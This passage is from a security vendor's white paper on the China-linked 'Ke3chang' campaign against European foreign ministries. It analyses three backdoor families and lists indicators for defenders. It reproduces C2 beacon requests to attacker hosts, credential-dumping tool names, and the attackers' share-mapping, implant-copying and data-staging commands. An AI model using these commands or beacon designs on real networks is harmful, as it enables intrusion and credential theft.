{
    "title": "wp-operation-ke3chang",
    "text": "SECURITY  \nREIMAGINED\nWHITE PAPER\nOPERATION \n“KE3CHANG”:\nT argeted Attacks Against \nMinistries of Foreign Affairs\nAuthors: Nart Villeneuve,  \nJames T. Bennett, Ned Moran, \nThoufique Haq, Mike Scott,  \nand Kenneth Geers2  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsCONTENTS\nExecutive Summary  ............................................................................................................................................................................................................................................................................................................... 3\nCommand and Control Analysis  ..................................................................................................................................................................................................................................................... 13\nAttribution Analysis  ....................................................................................................................................................................................................................................................................................................... 18\nConclusion  ................................................................................................................................................................................................................................................................................................................................................ 19\nAbout FireEye  ................................................................................................................................................................................................................................................................................................................................ 203  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsExecutive Summary\nDiplomatic missions, including ministries of \nforeign affairs (MFA), are high-priority targets for \ntoday’s cyber spies. Large-scale cyber espionage \ncampaigns such as “GhostNet” have demonstrat -\ned that government agencies around the world, \nincluding embassies, are vulnerable to targeted \ncyber attacks.1\nAs the crisis in Syria escalates, FireEye research -\ners have discovered a cyber espionage campaign, \nwhich we call “Ke3chang, ” that falsely advertises \ninformation updates about the ongoing crisis to \ncompromise MFA networks in Europe. We believe \nthat the Ke3chang attackers are operating out of \nChina and have been active since at least 2010. \nHowever, we believe specific Syria-themed \nattacks against MFAs (codenamed by Ke3chang \nas “moviestar”) began only in August 2013. The \ntiming of the attacks precedes a G20 meeting \nheld in Russia that focused on the crisis in Syria.2\nFireEye gained visibility into one of 23 known \ncommand-and-control (CnC) servers operated by \nthe Ke3chang actor for about one week. During \nthis time, we discovered 21 compromised \nmachines connecting to the CnC server. These \nincluded what appear to be three administrative \ntests by the attackers and two connections from \nother malware researchers. Among the targets, \nwe identified nine compromises at government \nministries in five different European countries. \nEight of these compromises were at MFAs.\nWhen FireEye had visibility on the CnC server, \nwe saw the attackers engage in post-compromise \ninformation gathering and lateral movement on \nthe target network, where upon FireEye immedi -\nately contacted the relevant authorities and \nbegan the notification process.The changing face of espionage\nAlas, poor James Bond. The days are over when \nspies had to be both a black belt and Prince \nCharming in the same scene. T oday, the vast \nmajority of intelligence collection is conducted \nthrough signals intelligence. The ubiquity and \nvulnerability of the Internet have opened windows \ninto the affairs of Washington, Beijing, and Moscow \nto a degree that Bond author, Ian Fleming, would \nnever have imagined.\nThe advanced persistent threat\nThe worldwide deployment of espionage-focused \nmalware has made this generation the Golden \nAge of espionage. Global reach, stealthy maneu -\nvers, legal cover, and plausible deniability—what \nmore could a spy ask for? That is why FireEye \nfocuses on the vexing problem of the advanced \npersistent threat (APT).\nAPT activity is best described as a campaign,  \na series of attacks over time. Each attack compris -\nes a variety of phases, including reconnaissance, \nexploitation, command and control, lateral \nmovement, and exfiltration.3 Intelligence can be \nextracted during each phase of the attack to build \na full understanding of the tools, techniques, and \nprocedures (TTPs) used by a particular APT \ncampaign’s life cycle. However, network defenders \nmay have only partial visibility into any single \nincident. That makes tracking and correlating \nactivity across multiple related incidents critical.\nThe Ke3chang campaign\nThe Ke3chang attackers have been active since  \nat least 2010. Tracking their activity over time has \nrevealed information on their targeting preferenc -\nes and the malware tools they use. The attackers \nhave used three types of malware over the years \nand have traditionally targeted the aerospace, \nenergy, government, high-tech, consulting \n1 Information Warfare Monitor. “Tracking GhostNet: Investigating a Cyber Espionage Network” . March 2009.  \nThe SecDev Group. “Shadows in the Cloud: An investigation into cyber espionage 2.0. ” April 2010.  SecureList. “’Red October’” Diplomatic Cyber Attacks \nInvestigation” . January 2013.   \nSecureList. “The NetTraveller” . June 2013.\n2 G20 Leaders’ Summit, St. Petersburg on September 5-6, 2013\n3 Cloppert, M. “Defining APT Campaigns” . June 2010.  \nCloppert, M. “Attacking the Cyber Kill Chain” . October 2009.  Bejtlich, R. “Incident Phases of Compromise” . June 2009.4  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign Affairsservices, and chemicals/manufacturing/mining \nsectors. However, the number of attacks against \nentities in these sectors has been small. The \nscarcity of individual attacks may indicate the \nattackers are selective about their targets.\nDuring August 2013, FireEye gained visibility on \none of 22 CnC servers used at that time by the \nKe3chang attackers. In addition to confirming \ncompromised endpoints at several MFAs, FireEye \ngained unique insight into the attackers’ lateral \nmovement activities. In this report, we present the \nhistorical intelligence we have gathered on the \nKe3chang campaign, as well as an in-depth \nassessment of the ongoing Syrian-themed attacks \nagainst these MFAs. Our objective is to arm \nnetwork defenders with information to combat \nthis threat actor.\nT argeting\nTraditionally, the Ke3chang attackers have used \nspear-phishing emails with either a malware attach -\nment or a link to a malicious download. They have \nalso leveraged a Java zero-day vulnerability \n(CVE-2012-4681), as well as older, reliable exploits for Microsoft Word (CVE-2010-3333) \nand Adobe PDF Reader (CVE-2010-2883). The \nKe3chang attackers have also sent Windows \nscreensaver files (.scr) and executable files (.exe) \nusing the Unicode Right-T o-Left-Override \n(RTLO) technique to cloak the original filename \nextension from the targeted user.4 In addition  \nto the recent Syria-themed campaign, they also \nused a London Olympics-themed campaign in \n2012 and one that involved former model and \nFrench first lady Carla Bruni in 2011.\nMalware analysis and timeline  \nOver the years, the Ke3chang attackers have  \nused three types of malware that we call: \n“BS2005” , “BMW” , and “MyWeb” . We believe \nthese three types of malware are an evolution of  \na single project from a single developer or small \nteam of developers sharing code. Functionally,  \nit is a typical first stage backdoor commonly found \nin APT attacks. It has the ability to upload and \ndownload files, run shell commands, and sleep for \na configurable length of time. All of the CnC commu -\nnications are performed over the HTTP protocol.Figure 1:  \nPercent of attacks \nby industry \ntargeted by \nKe3chang actor\n4 Ke3chang used the Java vulnerability (CVE-2012-4681) before a patch was available. Krebs, B. “’Right-to-Left Override’  \nAids Email Attacks” . September 2011.5  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsThe current Ke3chang campaign leverages  \nthe BS2005 malware, while older activity from \n2010-2011 leveraged BMW, followed by the \nMyWeb malware sporadically used in between.\nBS2005: Oct 2011 – present (most recent)\nBS2005 campaign: “moviestar”  \nJust as the media began to report on possible \nU.S. military intervention in Syria, the Ke3chang \nattackers began to use this topic as a lure to trick \ntheir targets into running their malware. Although \nattackers routinely employ breaking news as lures, \nthe targets of this campaign, codenamed by \nKe3chang as “moviestar” , were various ministries \nof foreign affairs in Europe. \nThe malware used in this most recent campaign is \nknown as “BS2005” . One sample was located in a  \nZIP file named “US_military_options_in_Syria.zip” \n(6cb633b371700d1bd6fde49ab38ca471) and \ncontained the file “US_military_options_in_Syria.pdf.\nexe” (b68a16cef982e6451ddf26568c60833d). \nThis executable is a “loader” that contains the \nprocess debugging (PDB) string:\nc:\\BS2005\\BS2005\\release\\Loader.pdb\nUpon execution, the loader drops another  \nexecutable “ie.exe” (277487587ae9c11d7f4b -\nd5336275a906) that contains the following \nPDB string:\nc:\\BS2005\\BS2005\\release\\IE.pdb\nThis executable has a compile date of 2013/07/25 \nand BS2005 is the most recent iteration of  the \nbackdoor. Upon execution of “ie.exe” , it beacons to a \nCnC host, named cascais.epac.to (IP: 122.10.83.51), \nwith the following HTTP traffic pattern:POST /p3oahin/<filename>.aspx -\n?r=<Base64 Encoded Data>=&a= \nHTTP/1.1  \nAccept: */*  \nAccept-Language: en-us  \nUA-CPU: x86  \nAccept-Encoding: gzip, deflate  \nUser-Agent: Mozilla/4.0 (compati -\nble; MSIE 7.0; Windows NT 5.1; .NET \nCLR 2.0.50727; .NET CLR \n3.0.04506.30)  \nHost: cascais.epac.to  \nContent-Length: 4  \nConnection: Keep-Alive  \n<Base64 Encoded Data>\nAlthough this sample uses the “/p3oahin/” path, \nwe have observed earlier samples that used the  \npath “/ke3chang/” and “/shfam9y/. ” The sample we \nanalyzed randomly chooses the <filename> to use \nin the URL from the following hard-coded list:\n• albumtop.aspx\n• blogvideo.aspx\n• celebrity.aspx\n• modules.aspx\n• newpage.aspx\n• pratty.aspx\n• tieback.aspx\n• ugctag.aspx\n• verycd.aspx\n• worldcat.aspx  \nIn addition, each sample contains a mark or \ncampaign tag, embedded in the Base64 callback \npayload that allows the attackers to keep track of \ntheir various campaigns. In this case, the mark in \nthe Syria-themed iteration of this campaign was \nconsistently the “moviestar” tag.6  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsEach byte of the CnC data goes through the \nfollowing transformation:\n• The data has 0x27 plus its positional index \nnumber added to it\n• It is then XOR’d with its positional index number\n• This data is then Base64 encoded, with ‘+’ \ncharacters being replaced with ‘*’ characters \nwhen the data is transmitted as a parameter \nin the URL\nThe Base64 data for the ‘r’ parameter decodes \nand decrypts to the following data format:\n<Local IP address>  \n<Computer name>  \n<Domain>  \n<Campaign marker>  \n<Date/Time>  \n<Command identifier>  \n<Volume serial number> <yes/no/nn>  \n<empty line>  \n<empty line>In this format, the <yes/no/nn> indicates whether \nmore data is available for command output or file \nupload. An “nn” refers to NOP/NOOP (“NO OPer -\nation”—a beacon signal).\nVarious versions of the BS2005 malware will use \na different constant for the addition part of the \nencryption routine and contain other information, \nsuch as the following:\n• Installed mail client\n• Internet Explorer version\n• Windows version\n• Whether a proxy server is configured\n• Whether a virtual machine was detected  \nIn addition to the Base64 data in the URI of the \nHTTP POST, the BS2005 malware also includes \nBase64  data in the body of the HTTP POST. The \nBase64 data for the POST body decodes and \ndecrypts to one of the following: “no, ” uploaded file \ncontent, or the output from the previous command.\nOnce the HTTP POST completes, the response is \nan HTML page with a hidden form (see Figure 3).   \nA particular string sequence is expected, which \nFigure 2:  \nBS2005 CnC \nencryption routine\n7  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign Affairscontains a command ID and delimited parameters. \nAll three malware families that FireEye analyzed \n(BS2005, MyWeb, and BMW) follow a similar \nCnC pattern in their HTTP replies.\nAt least one of the BS2005 samples contained a \nsimple anti-virtual machine heuristic. Specifically,  \nthe GetTickCount function is called and a loop is \nexecuted 999,999,990 times that simply incre -\nments a variable. After this loop completes, GetTick -\nCount is called again and the values are compared.  \nIf they are the same, the process terminates.\nA trait common to all three malware families we \nanalyzed is that they use the IWebBrowser2 \nCOM interface to perform their CnC communi -cation. This programming interface allows the \nprogrammer to reuse code from an existing \nbrowser (typically Internet Explorer) to perform \nWeb browsing, simplifying the development \nprocess. The network communication is actually \nperformed through the browser process, causing \nsome misdirection when it comes to determining \nwhich process is ultimately responsible for generat -\ning this network traffic. This technique is nothing \nnew for malware, but FireEye  did notice something \ninteresting in BS2005’s behavior.\nBS2005 attempts to kill any processes named \n“maxthon.exe” or “360se.exe. ” The “360se.exe” \nprocess seems to make sense, because it relates  \nto 360 Chinese anti-virus software. But why the Figure 3:  \nRendered Web \npage retrieved by \nBS2005 as HTTP \nREPLY to HTTP \nPOST\nFigure 4:  \nHTML retrieved \nby BS2005. The \nhighlighted portion \ncontains the \npost-compromise \ncommand data \nreturned back to \nthe malware\n8  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign Affairsmalware would be programmed to terminate \nMaxthon, a free browser developed by a Chinese \ncompany, was  initially unclear.\nUpon further investigation, we found that if  \na Maxthon browser is open while the BS2005 \nmalware uses this IWebBrowser2 COM interface \nto navigate to a Web page, the Maxthon browser \nopens a new tab and visibly navigates to the Web \npage itself. Instead of using other APIs to make \nWeb requests and read responses, the BS2005 \ndeveloper apparently dealt with this issue by \nsimply killing any Maxthon browser processes \nrunning on the target computer. This lack of \nsophistication is present throughout the code in \nall three malware families (BS2005, MyWeb, and \nBMW). BS2005 is actually the most complex of \nthe three, which makes sense given that it is the \nmost recent malware family we have seen.\nImprovements in the BS2005 version of the \nmalware include a “sleep until date/time” command \nand weak encryption for all CnC data; previous \niterations (MyWeb and BMW) did not encrypt the \nhost information sent in the beacon.BS2005 campaign: “snake”  \nIn 2011 a campaign, labeled “snake” by the \nattackers, started using the theme of nude photos  \nof the French prime minister’s wife, Carla Bruni,  \nas a lure. Attackers sent an email to various \ntargets that encouraged recipients to download  \na password-protected RAR file (see Figure 5).\nThe malware contained within the RAR  \nwas named “carla_bruni_nude_pics_spp.scr”  \n(727ef86947f5e109435298e077296a42 ).  \nWhen executed, the BS2005 malware connected to  \na CnC server with the following HTTP traffic pattern:\nPOST /ke3chang/Directx.aspx -\n?r=<Base64 Encoded Data> HTTP/1.1  \nAccept: */*  \nAccept-Language: en-us  \nUser-Agent: Mozilla/4.0 (compati -\nble; MSIE 8.0; Windows NT 5.1; \nTrident/4.0)  \nAccept-Encoding: gzip, deflate  \nHost: g20news.ns01.us  \nContent-Length: 4  \nConnection: Keep-Alive <Base64 \nEncoded Data>Figure 5:  \nBS2005 “snake” \ncampaign email \nattack vector\n9  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsThe CnC server’s hostname in this case contains \nthe string “g20news”; because of this, FireEye \nbelieves that the targets of the “snake” campaign \nmay have been related to the G20 finance ministers \nmeeting held in Paris, France on October 15, 2011.\nBS2005 campaigns: “dream/dolphin”  \nIn 2012, another series of attacks began that \nleveraged information about the London Olympics  \nin an attempt to lure targets into clicking on \nmalicious attachments (see Figure 6 and Figure 7). \nBased on information from the FireEye® Dynamic \nThreat Intelligence™ (DTI) cloud, we observed that \nthis campaign targeted a single firm in the Chemi -\ncals/Manufacturing/Mining sector.\nThese attacks leveraged older exploits in Adobe \nPDF Reader (CVE-2010-2883) and Microsoft \nWord (CVE-2010-3333). These BS2005-laced samples (ecc1167a5f45d72c899303f9bbe44bbc \nand b391d47b37841741a1817221b946854a) \nconnected to the following CnC servers:\n• news.studenttrail.com\n• skyline.ns1.name\nThe HTTP callback pattern to the CnCs in these \ncases was modified slightly from the earlier path \nof “/ke3chang/” to “/shfam9y/” .\nPOST /shfam9y/Default.aspx -\n?r=<Base64 Encoded Data>a= HTTP/1.1\nThis could represent an attempt to avoid any \nnetwork-based signatures that detect based on \nthe specific URL path of earlier samples. Lastly, \nthe addition constant for the CnC encryption \nroutine in these two BS2005 samples is 0x7C.\nFigure 6:  \nBS2005 “dream/\ndolphin” campaign \n2012  Olympic-\nthemed decoy \ncontent—daily \ncompetition \nschedule\n10  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsBS2005 campaign: “newtiger”  \nThree months after the Olympics-themed attacks, \nFireEye observed a new BS2005 campaign labeled \n“newtiger, ” which is possibly a reference to an older \n2010 campaign labeled “tiger. ” The decoy content \nin this case is a threat report from a well-known \nsecurity vendor (see Figure 8). Using information \nfrom the FireEye DTI cloud, FireEye observed \nthat this campaign targeted a single firm  in \nthe Services/Consulting sector.\nThe sample used in this attack (50dd -\n931b85891168244a10073f4a6f79) dropped \nBS2005 malware that connected to the CnC \nwww.trap.dsmtp.com and used the “/\nshfam9y/”  URI path.\nMyWeb: Jan 2010 – May 2011  \nThe Ke3chang attackers used the older “MyWeb” \nmalware family from 2010 to 2011. The MyWeb \nsample that FireEye analyzed has a compile date of 1/20/2011. At least one of the attacks in this \ncampaign leveraged a European security and \ndefense-themed lure, which aligns with the \ntargeting preferences for this group.\nMyWeb is the second-generation malware used \nby this threat actor; it was used after BMW but \nbefore BS2005. Improvements over BMW include \nan anti-sandbox detection technique, a configu -\nrable sleep value for the CnC beacon loop, and \na consolidated configuration block that enables \nthe malware author to change the CnC domain \nwithout having to recompile the malware.\nMyWeb’s anti-sandbox detection technique calls \nGetSystemTime, saving the value, then looping \n500,000 times calling GetSystemTime for each \nloop; finally, the malware compares the millisec -\nonds value of the last call with the value saved \nfrom the first call. If the values are equal, the \nmalware process terminates silently.Figure 7:  \nBS2005 “dream/\ndolphin” \ncampaign 2012 \nOlympic-themed \ndecoy content— \nearly check-in \ncommunication\n11  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsThe MyWeb configuration is stored in a \n104-byte block of encoded data appended to \nthe end of the portable executable (PE) file.  \nT o decode the configuration data, each charac -\nter has its positional index number added to it. \nThe CnC domain is stored at offset 0x0. Upon \nsuccessful connection to the CnC server, the malware sleeps for the amount of time that is \nstored in seconds at offset 0x20. The sleep value \nused for CnC connection failures is stored in \nminutes at offset 0x30.\nMyWeb only encrypts the command results data \nsent back to the CnC server using the same weak \nencryption algorithm as BS2005 (see Figure 2). \nThe addition constant for the encryption routine \nfor the sample we analyzed (be58180f4f7ee -\n6a643ab1469a40ffbca) is 0x5A. The beacon \ndata is transmitted  in URL parameters in \nplaintext and is self-explanatory:\nhxxp://ensun.dyndns.org/MYWEB/\nSearchX.ASpX?id1=<local IP  \naddress>&id2=<computer \nname>&id3=<volume serial num -\nber>&id4=<32 random alphabet char -\nacters>\nDownloaded and uploaded files are simply Base64 \nencoded. Command results are encrypted and \nthen Base64 encoded.Figure 8:  \nBS2005 “newtiger” \ncampaign security-\nthemed decoy \ncontent\nFigure 9:  \nMyWeb \nconfiguration block \ndecode routine\n12  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsBMW: July 2010  \nBMW is the earliest iteration of this malware that \nFireEye has seen and was used by the Ke3chang \nattackers in older 2010 attacks. The initial \ninfection vector is unknown; however, BMW was \npresumed to be delivered via weaponized email \nattachments/links—similar to the newer \ncampaigns leveraging MyWeb and BS2005. \nThe samples we analyzed have a compile date \nof 2010/07/08. This malware is known as BMW,  \ndue to the presence of this PDB string:\ne:\\DebugBmw1.0\\BMW\\release\\Large.\npdb\nBMW sample (649691e1d367721f0ff899\nfd31133915) beacons to CnC mail.yahoo.\nsendsmtp.com with the following fake HTTP \ntraffic:\nPOST /<filename>.aspx?Random=<16 \nRandom Alphabet Characters> \nHTTP/1.1 Accept: text/html, appli -\ncation/xhtml+xml, */*  \nAccept-Language: en-US  \nUser-Agent: Mozilla/5.0 (compati -\nble; MSIE 9.0; Windows NT 6.1; \nTrident/5.0) Accept-Encoding: \ngzip, deflate  \nHost: mail.yahoo.sendsmtp.com  \nContent-Length: 144  \nConnection: Keep-Alive\n<Base64 Encoded Data>The <filename> in the URI is randomly chosen \nfrom one of the following hard-coded entries \nwithin the malware binary:\n• acheb.aspx\n• bajree.aspx\n• cyacrin.aspx\n• dauber.aspx\n• eaves.aspx  \nThe Base64 encoded data in the POST body \ndecodes to the following:\n<Local IP address>  \n<Computer name>  \n<Domain>  \n<Browser version>  \n<Mail client>  \n<Campaign marker>  \n<Date/Time>  \n<ProxyEnable/ProxyDisable>  \n<Y/N>  \n<second parameter of last CnC \nresponse> <Last command executed>  \n<X Bytes>  \n<Volume serial number>\nThe <Y/N> data indicates whether the malware \nis running inside a virtual machine. The <X \nBytes> data indicates the number of bytes last \ndownloaded from the download file command.\nBMW encrypts uploaded and downloaded files \nand command results before Base64 encoding \nthem, using the same weak encryption algorithm \nas BS2005 (see Figure 2). The constant used for \naddition in the sample we analyzed is 0x5A.Figure 10:  \nDecoded MyWeb \nconfiguration block\n13  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsMalware Family Matrix  \nT able 1 is a complete list of all samples that were \nanalyzed as part of this investigation, along with  \nany known URI variances, campaign markers, and \ndecoy or lure themes used by this threat actor.Command and Control Analysis  \nThe Ke3chang attackers’ CnC infrastructure relies \nprimarily on domains obtained from dynamic \nDNS providers. The attackers shift IP addresses \nfrequently and often point their CnC domains to \nDropped File MD5 Compile  Data Family URI Mark/T ag Decoy/Lure Theme\n072af79bb2705b27ac2e8d61a25af04b 2010-01-25 MyWeb myweb\n82b1712156c5af50e634914501c24fb1 2010-01-25 MyWeb myweb\n8c8d6518910bc100e159b587a7eb7f8d 2010-05-10 MyWeb myweb\n649691e1d367721f0ff899fd31133915 2010-07-08 BMW tiger\naa0126970bab1fa5ef150ca9ef9d9e2e 2010-07-08 BMW tiger\n5cc39185b302cc446c503d34ce85bab7 2010-07-08 BMW tiger\nbe58180f4f7ee6a643ab1469a40ffbca 2011-01-20 MyWeb myweb\n2a3da83f4037ad82790b2a6f86e28aa2 2011-05-31 MyWeb EourdeghEuropean Security \nand Defense \n09b5f55ce2c73883c1f168ec34d70eb9 2011-10-18 BS2005 ke3chang snake Carla Bruni\n5ee64f9e44cddaa7ed11d752a149484d 2012-03-13 BS2005 shfam9y dream London Olympics\n026936afbbbdd9034f0a24b4032bd2f8 2012-03-22 BS2005 shfam9y dolphin London Olympics\n98f58f61f4510be9c531feb5f000172f 2012-06-01 BS2005 shfam9y newtiger McAfee Report\n8c7cf7baaf20fe9bec63eb8928afdb41 2012-07-10 BS2005 shfam9y dream\n4c46abe77c752f21a59ee03da0ad5011 2012-08-28 BS2005 shfam9y newtiger\ne75527a20bb75aa9d12a4d1df19b91fa 2012-08-30 BS2005 shfam9y black\nabe4a942cb26cd87a35480751c0e50ae 2012-09-07 BS2005 shfam9y sun\n62af361228a14b310042e69d6bab512c 2012-09-19 BS2005 shfam9y yong\n4c86634100493f0200bbdaf75efa0ebe 2012-11-19 BS2005 shfam9y pretty\n703c9218e52275ad36147f45258d540d 2013-04-18 BS2005 p3oahin logon\n277487587ae9c11d7f4bd5336275a906 2013-07-25 BS2005 p3oahin moviestar Syria\n777aab06646701c2c454db5c06982646 2013-07-25 BS2005 p3oahin odysseySecond stage /\nmoviestar\nc2c1bc15e7d172f9cd386548da917bed 2013-07-25 BS2005 p3oahin odyssey Draft agenda\nc718d03d7e48a588e54cc0942854cb9e 2013-08-21 BS2005 p3oahin brightoNational Day \nArrangement\ne4d8bb0b93f5da317d150f039964d734 2013-09-18 BS2005 p3oahin goldenTable 1:  \nKe3chang samples \nanalyzed14  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign Affairslegitimate IP addresses when they are not in use. \nT o date, we have observed the following domains \nused by each of these malware families:\nBS2005 \n• g20news.ns01.us \n• news.studenttrail.com\n• skyline.ns1.name\n• www.trap.dsmtp.com\n• ftp.backofficepower.com\n• news.freewww.info\n• blackberry.dsmtp.com\n• adele.zyns.com\n• windowsupdate.serveuser.com\n• officescan.securitynh.com\n• officescan.securitynh.com\n• cascais.epac.to\n• www.errorreporting.sendsmtp.com\n• www.sumba.freetcp.com\n• google.winfy.info\n• cname.yahoo.sendsmtp.comBMW\n• mail.yahoo.sendsmtp.com\n• update.msntoole.com\nMyWeb\n• expo2010.zyns.com\n• win7.sixth.biz\n• ensun.dyndns.org\n• www.spaces.ddns.us\n• blog.strancorproduct.info5\nWe have mapped out the relationship between \nthe CnC servers for all three malware families \nand have found that they have shared common \nhistorical IP addresses in the past.\nFigure 11:  \nCommon Ke3chang \nCnC infrastructure\n5 The sample was not located for this CnC; however, the callback and response captured by JsUnpack is consistent with the “Eourdegh”  \nvariant of the MyWeb malware, as outlined here: http://jsunpack.jeek.org/dec/go?report=e5f9dae61673a75db6dcb2475cb6ea8f22f66e9a15  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsUsing the IP addresses from the 23 CnC servers \nFireEye collected from our initial samples, we \nthen mapped all the IP addresses that these \ndomains resolved to. We then collected any \nother domains that also resolved to these IP \naddresses, resulting in at least 99 possible \nKe3chang CnC servers.Upon further analysis, we find that these 99 CnC \nservers are primarily located in the U.S., China, \nand Hong Kong.Figure 12:  \nExpanded \nKe3chang CnC \ninfrastructure\nFigure 13:  \nGeolocation of \nKe3chang CnC \ninfrastructure\n16  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsKe3chang CnC control panel  \nUpon accessing one of the Ke3chang CnC servers, \nwe found that the attackers have a Web-based \ncontrol panel that allows them to interact with \ncompromised computers, as shown in Figure 14.\nThe control panel also contains a link to an \n“AutoScanner” feature that includes several \npreconfigured commands to gather informa -\ntion about a compromised system and \nperform network reconnaissance on the \nendpoint (see Figure 15).Information gathering /  \nlateral movement analysis  \nOnce a compromised system connects to the CnC \nserver, the Ke3chang attackers follow a predeter -\nmined script. They first gather information about \nthe local computer and the network to which it is \nconnected. FireEye found the following tools on the \nCnC server, which the attackers  used to steal logon \ncredentials and move laterally across the network:  Figure 14:  \nKe3chang CnC \ncontrol panel\nFigure 15:  \nKe3chang  \nAutoScanner \ncommands\n17  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign Affairs• a7b20fe0bc6ae7f7a24670a732d2a021 \ngs.exe gsecdump v0.7 by [REDACTED] \n([REDACTED]@truesec.se)\n• 291503be3c25e52382f2a54420d03d71 \ngsl.exe \ngsecdump v0.6 by [REDACTED] \n([REDACTED]@truesec.se)\n• 8cdc9ffadbe4aad9418580b6ba2cc252 \nnete.exe  \nNetE v1.0 Questions, comments, \nbitches and bugs to [REDACTED]@\ncultdeadcow.com\n• 8cf6e698ecf3e167321a3ed2b9a9c62f \nPwDul2.exe 8cf6e698ecf3e -\n167321a3ed2b9a9c62f \nPwDump62.l.exe Usage: PwDul2.exe \n[-x][-n][-h][-o output_file][-u \nuser][-p password][-s share] ma -\nchineName\nAfter running the standard commands available in \nthe AutoScanner, the attackers often used the \n“net group” command to acquire information \nabout specific network groups revealed in the \npre-configured commands. This step was done \nmanually; we found several instances of typing \nerrors,  such as the following:\n• net group “[REDACTED]” /doamin\n• net group /doamin\nThe attackers then listed information for specific \nusers, focusing on users and groups suspected of \npossessing advanced rights such as domain \nadministrators and service accounts that have access to a wide range of systems.\nThen they used the “net use” command to map \nnetwork drives, including some that required a \npassword, as follows:\n• net use \\\\[REDACTED] [REDACT -\nED]:J: /user:[REDACTED]  \nIn some cases, they appeared to try and move \nlaterally by copying a file (always initially called \n“msn.tmp”) to other machines on the network. \nThey frequently changed the destination directo -\nry and filename of the target file, presumably to \nmake finding the malware more difficult for \nincident responders upon initial discovery.\n• net use \\\\172.xx.xx.x [REDACTED] \n/u:172.xx.xx.x\\[REDACTED]\n• dir \\\\172.xx.xx.x\\c$\n• dir “\\\\172.xx.xx.x\\c$\\Program \nFiles\\Adobe”\n• copy C:\\Users\\[REDACTED]\\AppDa -\nta\\Local\\Microsoft\\Windows\\msm.\ntmp \n“\\\\172.xx.xx.x\\c$\\Program Files\\\nCommon Files\\Adobe\\ARM\\1.0\\\nAdobeARM.exe” /y\nThe attackers then deleted the network shares:\n• net use \\\\[REDACTED] /del  Figure 16:  \nKe3chang \nAutoScanner \ncommand panel \noutput\n18  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsAfter that, attackers gathered specific data of \ninterest (such as the listings of all files in certain \ndirectories), and compressed it all within the RAR \narchive as follows:\n• %temp%/wmp32.dll a -m5 –hp[RE -\nDACTED] %temp%/tem.rar \n%temp%\\*dir*.*\nThey then checked the RAR archive, uploaded it to \nthe CnC server, and deleted the archive from the \ncompromised system:\n• dir %temp%/tem.rar\n• del C:\\DOCUME~1\\[REDACTED]\\\n[REDACTED]\\Temp\\tem.rar\nDuring our window of visibility, FireEye found \nevidence that the attackers were able to enumerate \nthe various target networks, move laterally to \ncompromise new systems, and finally to gather \ninformation that was compressed and uploaded to \nthe CnC server. However, FireEye lost visibility on \nthis Ke3chang CnC server before the attackers shifted to the major data exfiltration phase.\nAttribution Analysis  \nDetermining attribution requires more than just \nmalware analysis.6 It requires an understanding of \nthe attackers activities across the attack life cycle  \n(or “kill chain”), along with an assessment of \ncontextual indicators, such as the targeting, timing, \nand scope of the attacks.7 Unfortunately, this level  \nof visibility is not always available, which often leaves \nsignificant gaps in analysis. Therefore, exploring \ncompeting hypotheses is important, as is recogniz -\ning, and acknowledging areas of uncertainty.8\nMoreover, “attribution” can have multiple mean -\nings. Some use it to refer to an ultimate beneficiary, \nsuch as a nation-state, while others use the term  \nto refer to malware authors or CnC operators.9\nDuring our investigation, FireEye focused on \ntechnical clues left by the malware authors and CnC \noperators. Within the malware binaries themselves, \nlinguistic clues point to the malware authors’ use of \nthe Chinese language, as seen in Figure 17.\nFigure 17:  \nPE resource \ncontaining Chinese \ntext present in \nBS2005 sample\n6 Bejtlich, R. “Attribution Using 20 Characteristics “ . January 2010.\n7 Cloppert, M. “Defining APT Campaigns” . June 2010. Cloppert, M. “Attacking the Cyber Kill Chain” . October 2009.\n8 Carr, J. “Mandiant APT1 Report Has Critical Analytic Flaws” . February 2013.\n9 lark, D. & Landau, S. “Untangling Attribution” in Proceedings of a Workshop on Deterring Cyberattacks:  \nInforming Strategies and Developing Options for U.S. Policy. 2010.   \nBoebert, W. “A Survey of Challenges in Attribution” in Proceedings of a Workshop on Deterring Cyberattacks:  Informing Strategies and Developing Options \nfor U.S. Policy. 2010.19  www.fireeye.com\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsIn addition, the Ke3chang CnC control panel \ncontains a mix of Chinese and English words and \ncharacters. The subset of CnC servers that were \nnot hosted by dynamic DNS infrastructure was  \nregistered using a registrar in China (XIN NET) \nand the WHOIS records indicate that the \nregistrant is in China. The following email \naddresses were used to register those non-dy -\nnamic CnC domains:\n• xiaoxiao_222@yahoo.com\n• tk329@yahoo.com\n• zsy@gmail.com\nDuring our period of visibility into the BS2005 \n“moviestar” campaign against various ministries of \nforeign affairs in Europe, FireEye discovered that \nthe attackers had initially tested the malware in \nvirtual machines, prior to compromising actual \ntargets. We retrieved the output of the commands \nthe attackers had run when testing the malware. \nThe output indicates that the Ke3chang attackers \nare testing their malware in Windows operating \nsystems, with the default language set to Chinese.Based on this circumstantial evidence we believe \nthat the Ke3chang attackers are operating within \nChina. But their exact identities and motivation \nremain unknown.\nConclusion  \nMinistries of foreign affairs in Europe have been \ntargeted and compromised by a threat actor we \ncall Ke3chang. This attack used the crisis in Syria \nas a lure to deliver malware to its targets. The \ntiming of the attack precedes the G20 meeting in \nRussia that focused on the crisis in Syria. Further -\nmore, FireEye has presented evidence indicating \nthat the 